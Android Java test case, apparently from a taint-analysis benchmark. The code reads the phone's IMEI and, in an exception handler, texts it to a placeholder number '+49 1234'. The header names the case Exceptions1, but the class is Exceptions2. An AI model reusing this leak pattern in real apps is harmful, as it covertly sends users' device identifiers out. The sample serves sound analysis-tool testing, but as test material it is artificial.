package de.ecspride;

import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;

/**
 * @testcase_name Exceptions1
 * @version 0.2
 * @author Secure Software Engineering Group (SSE), European Center for Security and Privacy by Design (EC SPRIDE)
 * @author_mail steven.arzt@cased.de
 *
 * @description tainted data is created and sent out in an implicitly invoked exception handler
 * @dataflow source -> imei -> exception handler -> sink
 * @number_of_leaks 1
 * @challenges the analysis must handle implicit exceptions
 */
public class Exceptions2 extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        String imei = "";
        try {
            TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
            // source
            imei = telephonyManager.getDeviceId();
            int[] arr = new int[(int) Math.sqrt(49)];
        } catch (RuntimeException ex) {
            SmsManager sm = SmsManager.getDefault();
            // sink, leak
            sm.sendTextMessage("+49 1234", null, imei, null, null);
        }
    }
}